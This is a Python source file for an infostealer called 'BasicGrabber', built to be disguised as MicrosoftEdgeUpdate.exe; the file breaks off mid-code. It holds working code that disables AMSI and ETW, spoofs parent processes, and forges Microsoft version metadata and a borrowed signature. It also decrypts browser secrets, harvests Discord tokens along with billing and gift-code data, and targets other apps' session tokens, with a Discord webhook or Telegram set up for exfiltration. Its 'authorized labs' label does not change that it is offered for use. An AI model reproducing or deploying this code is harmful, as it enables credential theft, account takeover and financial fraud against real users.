#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BasicGrabber v1.1

Author: lsdbroh
https://github.com/lsdhub

Headless credential, banking-session and telemetry grabber for authorized labs.

Setup:
    pip install cryptography psutil
    pyinstaller --onefile --noconsole --name MicrosoftEdgeUpdate BasicGrabber.py

Usage:
    MicrosoftEdgeUpdate.exe --persist --lsass
    MicrosoftEdgeUpdate.exe --verbose --no-shots
    MicrosoftEdgeUpdate.exe --unpersist

Flags:
    --verbose        print progress
    --delay N        random sleep 0..N seconds
    --no-shots       skip screen capture
    --no-forge       skip PE metadata forging
    --no-evade       skip AMSI/ETW patching and Defender disarm
    --lsass          dump LSASS
    --quiet          lower concurrency, add jitter
    --persist        install onlogon task
    --unpersist      remove it
    --self-delete    delete the binary after dispatch
    --only a,b,c     run only these modules
    --skip a,b,c     skip these modules
"""

import argparse
import asyncio
import base64
import binascii
import ctypes
import gc
import hashlib
import json
import os
import platform
import random
import re
import shutil
import socket
import sqlite3
import ssl
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zlib
from concurrent.futures import ThreadPoolExecutor
from ctypes import wintypes
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

WEBHOOK_URL = "https://discord.com/api/webhooks/HERE U WEBHOOK MAN<3"
TELEGRAM_TOKEN = ""
TELEGRAM_CHAT = ""

USER_AGENT = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
HTTP_TIMEOUT = 15
RETRY_ATTEMPTS = 6
RETRY_BASE = 1.5
RETRY_CAP = 45.0
PORT_TIMEOUT = 0.45
PORT_WORKERS = 240
WEBHOOK_SOFT_LIMIT = 7_400_000
EMBEDS_PER_MSG = 5
EMBED_CHAR_BUDGET = 5200
FIELD_MAX = 1000
CONTACT_FILES = 500
CONTACT_BYTES = 262_144
LSASS_CAP = 6_000_000
CMD_TIMEOUT = 45

FEATURES = {
    "evasion": True,
    "defenses": True,
    "system": True,
    "network": True,
    "audit": True,
    "discord": True,
    "sessions": True,
    "cookies": True,
    "browser": True,
    "logins": True,
    "wallets": True,
    "financial": True,
    "contacts": True,
    "documents": True,
    "vaults": True,
    "clients": True,
    "riot": True,
    "artifacts": True,
    "lsass": False,
    "screenshots": True,
}

IS_WIN = os.name == "nt"
IS_ADMIN = False
try:
    IS_ADMIN = ctypes.windll.shell32.IsUserAnAdmin() != 0 if IS_WIN else os.geteuid() == 0
except Exception:
    pass

VERBOSE = False
QUIET = False
AGGRESSIVE = False
_MUTEX = None


def say(*args: Any) -> None:
    if VERBOSE:
        try:
            print(*args, flush=True)
        except Exception:
            pass


def decode(raw: bytes) -> str:
    """Console tools emit OEM codepage bytes, never assume UTF-8."""
    if not raw:
        return ""
    for codec in ("utf-8", "cp850", "cp1252", "mbcs"):
        try:
            return raw.decode(codec)
        except Exception:
            continue
    return raw.decode("latin-1", "replace")


async def breathe() -> None:
    if QUIET:
        await asyncio.sleep(random.uniform(0.15, 0.55))


class Crypto:
    """AES-GCM when available, sha256 keystream otherwise."""

    def __init__(self) -> None:
        self.aes = None
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            self.aes = AESGCM
        except Exception:
            pass

    def open(self, key: bytes, nonce: bytes, ct: bytes, tag: bytes) -> bytes:
        if not self.aes or len(key) < 32:
            return b""
        try:
            return self.aes(key[:32]).decrypt(nonce, ct + tag, None)
        except Exception:
            return b""

    def seal(self, raw: bytes) -> Tuple[bytearray, bytes]:
        if self.aes:
            key, nonce = os.urandom(32), os.urandom(12)
            return bytearray(b"BG2" + nonce + self.aes(key).encrypt(nonce, raw, None)), key
        key = os.urandom(32)
        stream, out, index = hashlib.sha256(key).digest(), bytearray(), 0
        while len(out) < len(raw):
            stream = hashlib.sha256(stream + struct.pack("<I", index)).digest()
            out += stream
            index += 1
        return bytearray(b"BG1" + zlib.compress(bytes(a ^ b for a, b in zip(raw, out)), 9)), key


CRYPTO = Crypto()


def scrub(*buffers: Any) -> None:
    """Zero mutable buffers after use."""
    for buf in buffers:
        if isinstance(buf, bytearray) and buf:
            ctypes.memset((ctypes.c_char * len(buf)).from_buffer(buf), 0, len(buf))
            del buf[:]


class Native:
    """ctypes patches applied to the current process."""

    @staticmethod
    def addr(module: str, name: str) -> Optional[int]:
        if not IS_WIN:
            return None
        handle = ctypes.windll.kernel32.GetModuleHandleW(module)
        if not handle:
            handle = ctypes.windll.kernel32.LoadLibraryW(module)
        if not handle:
            return None
        proc = ctypes.windll.kernel32.GetProcAddress(handle, name.encode())
        return ctypes.cast(proc, ctypes.c_void_p).value if proc else None

    @staticmethod
    def patch(module: str, name: str, payload: bytes) -> bool:
        target = Native.addr(module, name)
        if not target:
            return False
        kernel = ctypes.windll.kernel32
        old = ctypes.c_ulong()
        if not kernel.VirtualProtect(ctypes.c_void_p(target), len(payload), 0x40,
                                     ctypes.byref(old)):
            return False
        ctypes.memmove(ctypes.c_void_p(target), payload, len(payload))
        kernel.VirtualProtect(ctypes.c_void_p(target), len(payload), old.value, ctypes.byref(old))
        return True

    @staticmethod
    def amsi() -> bool:
        return Native.patch("amsi.dll", "AmsiScanBuffer", b"\xB8\x57\x00\x07\x80\xC3")

    @staticmethod
    def etw() -> bool:
        return Native.patch("ntdll.dll", "EtwEventWrite", b"\x33\xC0\xC3")

    @staticmethod
    def hide_thread() -> bool:
        if not IS_WIN:
            return False
        try:
            current = ctypes.windll.kernel32.GetCurrentThread()
            flag = ctypes.c_ulong(0)
            ctypes.windll.ntdll.NtSetInformationThread(
                ctypes.c_void_p(current), 0x11, ctypes.byref(flag), ctypes.sizeof(flag))
            return True
        except Exception:
            return False

    @staticmethod
    def dpapi(blob: bytes) -> bytes:
        if not IS_WIN or not blob:
            return b""
        try:
            class BLOB(ctypes.Structure):
                _fields_ = [("cb", wintypes.DWORD), ("pb", ctypes.POINTER(wintypes.BYTE))]

            src = ctypes.create_string_buffer(blob, len(blob))
            inb = BLOB(len(blob), ctypes.cast(src, ctypes.POINTER(wintypes.BYTE)))
            outb = BLOB()
            if ctypes.windll.crypt32.CryptUnprotectData(
                    ctypes.byref(inb), None, None, None, None, 0, ctypes.byref(outb)):
                data = ctypes.string_at(outb.pb, outb.cb)
                ctypes.windll.kernel32.LocalFree(outb.pb)
                return data
        except Exception:
            pass
        return b""


class STARTUPINFOW(ctypes.Structure):
    _fields_ = [("cb", wintypes.DWORD), ("lpReserved", wintypes.LPWSTR),
                ("lpDesktop", wintypes.LPWSTR), ("lpTitle", wintypes.LPWSTR),
                ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
                ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD),
                ("dwXCountChars", wintypes.DWORD), ("dwYCountChars", wintypes.DWORD),
                ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
                ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD),
                ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
                ("hStdInput", wintypes.HANDLE), ("hStdOutput", wintypes.HANDLE),
                ("hStdError", wintypes.HANDLE)]


class STARTUPINFOEXW(ctypes.Structure):
    _fields_ = [("StartupInfo", STARTUPINFOW), ("lpAttributeList", ctypes.c_void_p)]


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD)]


class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("nLength", wintypes.DWORD), ("lpSecurityDescriptor", ctypes.c_void_p),
                ("bInheritHandle", wintypes.BOOL)]


class Spawn:
    """CreateProcessW with spoofed parent, block-non-MS policy and captured stdout."""

    EXTENDED = 0x00080000
    NO_WINDOW = 0x08000000
    USE_STD_HANDLES = 0x00000100
    ATTR_PARENT = 0x00020000
    ATTR_POLICY = 0x00020007
    BLOCK_NON_MS = 0x00001000

    @staticmethod
    def explorer_pid() -> int:
        try:
            import psutil
            for proc in psutil.process_iter(["pid", "name"]):
                if (proc.info["name"] or "").lower() == "explorer.exe":
                    return proc.info["pid"]
        except Exception:
            pass
        return 0

    @classmethod
    def run(cls, cmdline: str, timeout: int = CMD_TIMEOUT) -> Tuple[bool, bytes]:
        if not IS_WIN:
            try:
                result = subprocess.run(cmdline, shell=True, capture_output=True,
                                        timeout=timeout)
                return True, result.stdout or b""
            except Exception:
                return False, b""

        kernel = ctypes.windll.kernel32
        kernel.InitializeProcThreadAttributeList.argtypes = [
            ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(ctypes.c_size_t)]
        kernel.UpdateProcThreadAttribute.argtypes = [
            ctypes.c_void_p, wintypes.DWORD, ctypes.c_size_t, ctypes.c_void_p,
            ctypes.c_size_t, ctypes.c_void_p, ctypes.POINTER(ctypes.c_size_t)]
        kernel.CreateProcessW.argtypes = [
            wintypes.LPCWSTR, wintypes.LPWSTR, ctypes.c_void_p, ctypes.c_void_p,
            wintypes.BOOL, wintypes.DWORD, ctypes.c_void_p, wintypes.LPCWSTR,
            ctypes.c_void_p, ctypes.c_void_p]
        kernel.CreatePipe.argtypes = [ctypes.POINTER(wintypes.HANDLE),
                                      ctypes.POINTER(wintypes.HANDLE),
                                      ctypes.POINTER(SECURITY_ATTRIBUTES), wintypes.DWORD]
        kernel.SetHandleInformation.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.DWORD]
        kernel.ReadFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD,
                                    ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]

        size = ctypes.c_size_t(0)
        kernel.InitializeProcThreadAttributeList(None, 2, 0, ctypes.byref(size))
        buffer = ctypes.create_string_buffer(size.value)
        attrs = ctypes.cast(buffer, ctypes.c_void_p)
        if not kernel.InitializeProcThreadAttributeList(attrs, 2, 0, ctypes.byref(size)):
            return False, b""

        parent = None
        pid = cls.explorer_pid()
        if pid:
            parent = kernel.OpenProcess(0x0080, False, pid)
            if parent:
                handle = ctypes.c_void_p(parent)
                kernel.UpdateProcThreadAttribute(attrs, 0, cls.ATTR_PARENT,
                                                 ctypes.byref(handle),
                                                 ctypes.sizeof(ctypes.c_void_p), None, None)

        policy = ctypes.c_uint64(cls.BLOCK_NON_MS)
        kernel.UpdateProcThreadAttribute(attrs, 0, cls.ATTR_POLICY,
                                         ctypes.byref(policy), ctypes.sizeof(policy), None, None)

        read_end, write_end = wintypes.HANDLE(), wintypes.HANDLE()
        security = SECURITY_ATTRIBUTES()
        security.nLength = ctypes.sizeof(SECURITY_ATTRIBUTES)
        security.bInheritHandle = True
        has_pipe = bool(kernel.CreatePipe(ctypes.byref(read_end), ctypes.byref(write_end),
                                          ctypes.byref(security), 0))
        if has_pipe:
            kernel.SetHandleInformation(read_end, 0x00000001, 0)

        info = STARTUPINFOEXW()
        info.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEXW)
        info.lpAttributeList = attrs
        if has_pipe:
            info.StartupInfo.dwFlags = cls.USE_STD_HANDLES
            info.StartupInfo.hStdOutput = write_end
            info.StartupInfo.hStdError = write_end

        process = PROCESS_INFORMATION()
        cmd = ctypes.create_unicode_buffer(cmdline)
        ok = kernel.CreateProcessW(None, cmd, None, None, has_pipe,
                                   cls.EXTENDED | cls.NO_WINDOW, None, None,
                                   ctypes.byref(info), ctypes.byref(process))
        if has_pipe:
            kernel.CloseHandle(write_end)
        try:
            kernel.DeleteProcThreadAttributeList(attrs)
        except Exception:
            pass
        if parent:
            kernel.CloseHandle(parent)
        if not ok:
            if has_pipe:
                kernel.CloseHandle(read_end)
            return False, b""

        chunks: List[bytes] = []

        def reader() -> None:
            buffer_read = ctypes.create_string_buffer(65536)
            count = wintypes.DWORD()
            while True:
                if not kernel.ReadFile(read_end, buffer_read, 65536, ctypes.byref(count), None):
                    break
                if not count.value:
                    break
                chunks.append(buffer_read.raw[:count.value])

        if has_pipe:
            worker = threading.Thread(target=reader, daemon=True)
            worker.start()

        kernel.WaitForSingleObject(process.hProcess, int(timeout * 1000))
        if has_pipe:
            kernel.CloseHandle(read_end)
            worker.join(3)
        kernel.CloseHandle(process.hThread)
        kernel.CloseHandle(process.hProcess)
        return True, b"".join(chunks)


class Win:
    @staticmethod
    def hide() -> None:
        if not IS_WIN:
            return
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except Exception:
            pass

    @staticmethod
    def mutex(name: str = "Global\\MicrosoftEdgeUpdateSvc_d18") -> bool:
        global _MUTEX
        if not IS_WIN:
            return True
        try:
            _MUTEX = ctypes.windll.kernel32.CreateMutexW(None, False, name)
            return ctypes.windll.kernel32.GetLastError() != 183
        except Exception:
            return True

    @staticmethod
    def dpi() -> None:
        if not IS_WIN:
            return
        try:
            ctypes.windll.shcore.SetProcessDpiAwareness(2)
        except Exception:
            try:
                ctypes.windll.user32.SetProcessDPIAware()
            except Exception:
                pass

    @staticmethod
    def reg(root: Any, path: str, name: str) -> Optional[Any]:
        if not IS_WIN:
            return None
        try:
            import winreg
            with winreg.OpenKey(root, path, 0, winreg.KEY_READ) as key:
                return winreg.QueryValueEx(key, name)[0]
        except Exception:
            return None

    @staticmethod
    def values(root: Any, path: str) -> Dict[str, Any]:
        out: Dict[str, Any] = {}
        if not IS_WIN:
            return out
        try:
            import winreg
            with winreg.OpenKey(root, path, 0, winreg.KEY_READ) as key:
                index = 0
                while True:
                    try:
                        name, value, _ = winreg.EnumValue(key, index)
                        out[name] = value
                        index += 1
                    except OSError:
                        break
        except Exception:
            pass
        return out

    @staticmethod
    def subkeys(root: Any, path: str) -> List[str]:
        out: List[str] = []
        if not IS_WIN:
            return out
        try:
            import winreg
            with winreg.OpenKey(root, path, 0, winreg.KEY_READ) as key:
                index = 0
                while True:
                    try:
                        out.append(winreg.EnumKey(key, index))
                        index += 1
                    except OSError:
                        break
        except Exception:
            pass
        return out

    @staticmethod
    def run(args: List[str], timeout: int = 25) -> str:
        """Capture bytes and decode, console tools are never UTF-8."""
        try:
            result = subprocess.run(args, capture_output=True, timeout=timeout,
                                    creationflags=0x08000000 if IS_WIN else 0)
            return decode(result.stdout or b"")
        except Exception:
            return ""

    @staticmethod
    def ps(script: str, timeout: int = CMD_TIMEOUT) -> str:
        preamble = (
            "$a=[Ref].Assembly.GetTypes();"
            "ForEach($b in $a){if($b.Name -like '*iUtils'){$c=$b}};"
            "$d=$c.GetFields('NonPublic,Static');"
            "ForEach($e in $d){if($e.Name -like '*Context'){$f=$e}};"
            "$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);"
            "[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1);"
        )
        encoded = base64.b64encode((preamble + script).encode("utf-16-le")).decode()
        ok, raw = Spawn.run(f"powershell -NoProfile -NonInteractive "
                            f"-ExecutionPolicy Bypass -EncodedCommand {encoded}", timeout)
        if ok and raw:
            return decode(raw)
        if not ok:
            try:
                result = subprocess.run(
                    ["powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy",
                     "Bypass", "-Command", script],
                    capture_output=True, timeout=timeout, creationflags=0x08000000)
                return decode(result.stdout or b"")
            except Exception:
                return ""
        return ""


class Forge:
    """Microsoft-shaped VERSIONINFO plus a grafted certificate table on a copy."""

    RT_VERSION, RT_MANIFEST, SECURITY = 16, 24, 4
    NAME = "MicrosoftEdgeUpdate.exe"
    SOURCES = (r"System32\WindowsPowerShell\v1.0\powershell.exe",
               r"System32\notepad.exe", r"System32\msiexec.exe")
    VER = (10, 0, 19041, 1)
    COMPANY = "Microsoft Corporation"
    PRODUCT = "Microsoft Edge Update"

    @staticmethod
    def _pad(blob: bytes) -> bytes:
        return blob + b"\x00" * ((4 - len(blob) % 4) % 4)

    @classmethod
    def _node(cls, key: str, value: bytes, wtype: int = 1, vlen: Optional[int] = None) -> bytes:
        keyb = cls._pad(key.encode("utf-16-le") + b"\x00\x00")
        valb = cls._pad(value) if value else b""
        total = 6 + len(keyb) + len(valb)
        return struct.pack("<HHH", total, len(value) if vlen is None else vlen, wtype) + keyb + valb

    @classmethod
    def _version_info(cls) -> bytes:
        ms = (cls.VER[0] << 16) | cls.VER[1]
        ls = (cls.VER[2] << 16) | cls.VER[3]
        fixed = struct.pack("<IIIIIIIIIIIII", 0xFEEF04BD, 0x10000, ms, ls, ms, ls,
                            0x3F, 0, 0x40004, 1, 0, 0, 0)

        def text(name: str, value: str) -> bytes:
            raw = value.encode("utf-16-le") + b"\x00\x00"
            return cls._node(name, raw, 1, len(raw))

        ver = ".".join(map(str, cls.VER))
        table = b"".join([text("CompanyName", cls.COMPANY),
                          text("FileDescription", cls.PRODUCT),
                          text("FileVersion", ver), text("InternalName", cls.NAME),
                          text("OriginalFilename", cls.NAME),
                          text("ProductName", cls.PRODUCT), text("ProductVersion", ver),
                          text("LegalCopyright", "(c) Microsoft Corporation.")])
        string_info = cls._node("StringFileInfo", cls._node("040904B0", table, 1, 0), 1, 0)
        var_info = cls._node("VarFileInfo", cls._node(
            "Translation", struct.pack("<HH", 0x0409, 0x04B0), 0, 4), 1, 0)
        return cls._node("VS_VERSION_INFO", fixed + string_info + var_info, 0, len(fixed))

    @classmethod
    def _manifest(cls) -> bytes:
        return (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">'
            '<assemblyIdentity type="win32" name="Microsoft.EdgeUpdate" version="10.0.19041.1"'
            ' processorArchitecture="amd64"/><description>Microsoft Edge Update</description>'
            '<trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"><security><requestedPrivileges>'
            '<requestedExecutionLevel level="asInvoker" uiAccess="false"/>'
            '</requestedPrivileges></security></trustInfo>'
            '<compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1"><application>'
            '<supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/></application>'
            '</compatibility></assembly>').encode()

    @classmethod
    def _resources(cls, target: Path) -> bool:
        kernel = ctypes.WinDLL("kernel32", use_last_error=True)
        kernel.BeginUpdateResourceW.restype = ctypes.c_void_p
        kernel.BeginUpdateResourceW.argtypes = [ctypes.c_wchar_p, ctypes.c_bool]
        kernel.UpdateResourceW.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
                                           ctypes.c_ushort, ctypes.c_void_p, ctypes.c_uint32]
        kernel.EndUpdateResourceW.argtypes = [ctypes.c_void_p, ctypes.c_bool]

        handle = kernel.BeginUpdateResourceW(str(target), False)
        if not handle:
            return False
        ok = True
        for rtype, payload in ((cls.RT_VERSION, cls._version_info()),
                               (cls.RT_MANIFEST, cls._manifest())):
            buffer = ctypes.create_string_buffer(payload, len(payload))
            if not kernel.UpdateResourceW(handle, ctypes.c_void_p(rtype), ctypes.c_void_p(1),
                                          0x0409, ctypes.cast(buffer, ctypes.c_void_p),
                                          len(payload)):
                ok = False
        kernel.EndUpdateResourceW(handle, not ok)
        return ok

    @classmethod
    def _cert(cls) -> bytes:
        root = Path(os.environ.get("SystemRoot", r"C:\Windows"))
        for rel in cls.SOURCES:
            src = root / rel
            if not src.is_file():
                continue
            try:
                data = src.read_bytes()
                if data[:2] != b"MZ":
                    continue
                pe = struct.unpack_from("<I", data, 0x3C)[0]
                if data[pe:pe + 4] != b"PE\0\0":
                    continue
                opt = pe + 24
                dd = opt + (112 if struct.unpack_from("<H", data, opt)[0] == 0x20B else 96)
                va, size = struct.unpack_from("<II", data, dd + cls.SECURITY * 8)
                if va and size > 16 and va + size <= len(data):
                    return data[va:va + size]
            except Exception:
                continue
        return b""

    @classmethod
    def _attach(cls, target: Path, blob: bytes) -> bool:
        if not blob:
            return False
        try:
            data = bytearray(target.read_bytes())
            while len(data) % 8:
                data += b"\x00"
            offset = len(data)
            data += blob
            pe = struct.unpack_from("<I", data, 0x3C)[0]
            opt = pe + 24
            dd = opt + (112 if struct.unpack_from("<H", data, opt)[0] == 0x20B else 96)
            struct.pack_into("<II", data, dd + cls.SECURITY * 8, offset, len(blob))
            struct.pack_into("<I", data, opt + 64, 0)
            target.write_bytes(bytes(data))
            return True
        except Exception:
            return False

    @classmethod
    def build(cls) -> Optional[Path]:
        if not (IS_WIN and getattr(sys, "frozen", False)):
            return None
        try:
            dest = Path(os.environ["LOCALAPPDATA"]) / "Microsoft" / "EdgeUpdate"
            dest.mkdir(parents=True, exist_ok=True)
            target = dest / cls.NAME
            shutil.copy2(sys.executable, target)
            cls._resources(target)
            cls._attach(target, cls._cert())
            return target
        except Exception:
            return None

    @staticmethod
    def relaunch(path: Path) -> None:
        try:
            subprocess.Popen([str(path)], cwd=str(path.parent), close_fds=True,
                             creationflags=0x00000008 | 0x00000200,
                             env={**os.environ, "BS_FORGED": "1"},
                             stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
        except Exception:
            pass


class Browsers:
    @staticmethod
    def roots() -> Dict[str, Path]:
        table: Dict[str, Path] = {}
        if IS_WIN:
            la = Path(os.environ.get("LOCALAPPDATA", ""))
            ad = Path(os.environ.get("APPDATA", ""))
            table = {
                "Chrome": la / "Google/Chrome/User Data",
                "Chrome Beta": la / "Google/Chrome Beta/User Data",
                "Chrome SxS": la / "Google/Chrome SxS/User Data",
                "Brave": la / "BraveSoftware/Brave-Browser/User Data",
                "Edge": la / "Microsoft/Edge/User Data",
                "Opera": ad / "Opera Software/Opera Stable",
                "Opera GX": ad / "Opera Software/Opera GX Stable",
                "Vivaldi": la / "Vivaldi/User Data",
                "Yandex": la / "Yandex/YandexBrowser/User Data",
                "Chromium": la / "Chromium/User Data",
                "Arc": la / "Arc/User Data",
            }
        elif platform.system() == "Linux":
            config = Path.home() / ".config"
            table = {"Chrome": config / "google-chrome",
                     "Brave": config / "BraveSoftware/Brave-Browser",
                     "Edge": config / "microsoft-edge", "Chromium": config / "chromium",
                     "Vivaldi": config / "vivaldi", "Opera": config / "opera"}
        elif platform.system() == "Darwin":
            support = Path.home() / "Library/Application Support"
            table = {"Chrome": support / "Google/Chrome",
                     "Brave": support / "BraveSoftware/Brave-Browser",
                     "Edge": support / "Microsoft/Edge", "Arc": support / "Arc"}
        return {k: v for k, v in table.items() if v.is_dir()}

    @staticmethod
    def profiles(root: Path) -> List[str]:
        out = ["Default"]
        try:
            for entry in root.iterdir():
                if entry.is_dir() and entry.name != "Default":
                    if entry.name.startswith("Profile") or entry.name == "Guest Profile":
                        out.append(entry.name)
        except Exception:
            pass
        return out

    @staticmethod
    def key(root: Path) -> bytes:
        try:
            state = json.loads((root / "Local State").read_text("utf-8", "ignore"))
            blob = base64.b64decode(state.get("os_crypt", {}).get("encrypted_key", ""))
            return Native.dpapi(blob[5:] if blob.startswith(b"DPAPI") else blob)
        except Exception:
            return b""

    @staticmethod
    def db(path: Path) -> Optional[sqlite3.Connection]:
        try:
            return sqlite3.connect(f"file:{path}?mode=ro&immutable=1", uri=True, timeout=3)
        except Exception:
            return None

    @staticmethod
    def decrypt(enc: bytes, key: bytes) -> str:
        if not isinstance(enc, (bytes, bytearray)) or not enc:
            return ""
        if enc[:3] in (b"v10", b"v11") and key and len(enc) > 31:
            return CRYPTO.open(key, enc[3:15], enc[15:-16], enc[-16:]).decode("utf-8", "ignore")
        if enc[:3] == b"v20":
            return enc[3:].decode("utf-8", "ignore")
        return enc.decode("utf-8", "ignore")

    @staticmethod
    def firefox_root() -> Optional[Path]:
        base = {"Windows": Path(os.environ.get("APPDATA", "")) / "Mozilla/Firefox/Profiles",
                "Linux": Path.home() / ".mozilla/firefox",
                "Darwin": Path.home() / "Library/Application Support/Firefox/Profiles"
                }.get(platform.system())
        return base if base and base.is_dir() else None


TOKEN_RE = re.compile(rb"dQw4w9WgXcQ:([A-Za-z0-9+/=_\-]{40,})")


def token_ok(token: str) -> bool:
    if not token or len(token) < 50:
        return False
    parts = token.split(".")
    return len(parts) == 3 and all(parts)


class Discord:
    """Stable, canary, ptb, development, Store package and client forks."""

    def dirs(self) -> List[Tuple[Path, str]]:
        found: Dict[str, Path] = {}
        if IS_WIN:
            for base in (Path(os.environ.get("APPDATA", "")),
                         Path(os.environ.get("LOCALAPPDATA", ""))):
                try:
                    for entry in base.iterdir():
                        if entry.is_dir() and "discord" in entry.name.lower():
                            found[entry.name] = entry
                except Exception:
                    pass
            try:
                for entry in (Path(os.environ.get("LOCALAPPDATA", "")) / "Packages").glob("Discord*"):
                    for cache in entry.glob("LocalCache/Roaming/*"):
                        if cache.is_dir():
                            found[f"Store/{cache.name}"] = cache
            except Exception:
                pass
        else:
            base = Path.home() / (".config" if platform.system() == "Linux"
                                  else "Library/Application Support")
            try:
                for entry in base.iterdir():
                    if "discord" in entry.name.lower():
                        found[entry.name] = entry
            except Exception:
                pass
        return [(p, n) for n, p in found.items() if (p / "Local Storage" / "leveldb").is_dir()]

    @staticmethod
    def _harvest(leveldb: Path, key: bytes) -> List[str]:
        out: List[str] = []
        if not leveldb.is_dir():
            return out
        for entry in leveldb.iterdir():
            if entry.suffix not in (".log", ".ldb"):
                continue
            try:
                blob = entry.read_bytes()
            except Exception:
                continue
            for match in TOKEN_RE.finditer(blob):
                try:
                    raw = base64.b64decode(match.group(1))
                except Exception:
                    continue
                if len(raw) < 15:
                    continue
                plain = CRYPTO.open(key, raw[3:15], raw[15:-16], raw[-16:]).decode("utf-8", "ignore")
                if token_ok(plain.strip()):
                    out.append(plain.strip())
                elif token_ok(raw.decode("utf-8", "ignore").strip()):
                    out.append(raw.decode("utf-8", "ignore").strip())
        return out

    def tokens(self) -> List[Dict[str, Any]]:
        jobs: List[Tuple[Path, str, bytes]] = []
        for path, name in self.dirs():
            jobs.append((path / "Local Storage" / "leveldb", name, Browsers.key(path)))
        for name, root in Browsers.roots().items():
            key = Browsers.key(root)
            for profile in Browsers.profiles(root):
                jobs.append((root / profile / "Local Storage" / "leveldb",
                             f"{name} ({profile})", key))

        results: List[Dict[str, Any]] = []
        seen: set = set()
        with ThreadPoolExecutor(max_workers=6 if QUIET else 16) as pool:
            futures = {pool.submit(self._harvest, p, k): n for p, n, k in jobs}
            for future, source in futures.items():
                try:
                    for token in future.result(timeout=25):
                        if token not in seen:
                            seen.add(token)
                            results.append({"source": source, "token": token})
                except Exception:
                    continue
        return results

    @staticmethod
    def _api(token: str, endpoint: str) -> Optional[Any]:
        request = urllib.request.Request(
            f"https://discord.com/api/v10/{endpoint}",
            headers={"Authorization": token, "User-Agent": USER_AGENT})
        try:
            with urllib.request.urlopen(request, timeout=HTTP_TIMEOUT) as response:
                if response.status == 200:
                    return json.loads(response.read().decode())
        except Exception:
            return None
        return None

    def enrich(self, items: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        if not items:
            return []
        out: List[Dict[str, Any]] = []
        with ThreadPoolExecutor(max_workers=3 if QUIET else 5) as pool:
            futures = {pool.submit(self._one, item): item for item in items}
            for future, item in futures.items():
                try:
                    out.append(future.result(timeout=40))
                except Exception:
                    item["valid"] = False
                    out.append(item)
        return out

    def _one(self, item: Dict[str, Any]) -> Dict[str, Any]:
        token = item["token"]
        result: Dict[str, Any] = {**item, "valid": False, "profile": {}, "guilds": [],
                                  "connections": [], "friends": [], "billing": {},
                                  "nitro": {}, "gift_codes": []}
        me = self._api(token, "users/@me")
        if not me:
            return result
        result["valid"] = True
        keep = ("id", "username", "discriminator", "global_name", "email", "phone",
                "verified", "mfa_enabled", "premium_type", "locale", "bio", "flags")
        result["profile"] = {k: me[k] for k in keep if me.get(k) is not None}

        connections = self._api(token, "users/@me/connections")
        if isinstance(connections, list):
            result["connections"] = [{"type": c.get("type"), "name": c.get("name")}
                                     for c in connections[:50]]
        guilds = self._api(token, "users/@me/guilds")
        if isinstance(guilds, list):
            result["guilds"] = [{"name": g.get("name"), "owner": g.get("owner")}
                                for g in guilds[:100]]
        relations = self._api(token, "users/@me/relationships")
        if isinstance(relations, list):
            result["friends"] = [{"type": r.get("type"),
                                  "name": (r.get("user") or {}).get("username")}
                                 for r in relations[:100]]
        payments = self._api(token, "users/@me/billing/payments")
        if isinstance(payments, list) and payments:
            result["billing"] = {"count": len(payments), "last": payments[0]}
        subs = self._api(token, "users/@me/billing/subscriptions")
        if isinstance(subs, list) and subs:
            result["nitro"] = subs[0]
        gifts = self._api(token, "users/@me/entitlements/gift-codes?with_application=false")
        if isinstance(gifts, list) and gifts:
            result["gift_codes"] = [{"code": g.get("code")} for g in gifts[:20]]
        return result


class Sessions:
    """Tokens kept on disk by other Electron clients."""

    APPS = {
        "Slack": "%APPDATA%/Slack",
        "Teams": "%APPDATA%/Microsoft/Teams",
        "Element": "%APPDATA%/Element",
        "Notion": "%APPDATA%/Notion",
        "Figma": "%APPDATA%/Figma",
        "Postman": "%APPDATA%/Postman",
        "Insomnia": "%APPDATA%/Insomnia",
        "Obsidian": "%APPDATA%/obsidian",
        "VSCode": "%APPDATA%/Code/User/globalStorage",
        "WhatsApp": "%APPDATA%/WhatsApp",
        "Signal": "%APPDATA%/Signal",
    }
    PATTERNS = {
        "jwt": re.compile(r"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"),
        "bearer": re.compile(r"(?i)bearer\s+([A-Za-z0-9._\-]{20,})"),
        "slack": re.compile(r"xox[abposr]-[A-Za-z0-9\-]{10,}"),
        "github": re.compile(r"gh[pousr]_[A-Za-z0-9]{20,}"),
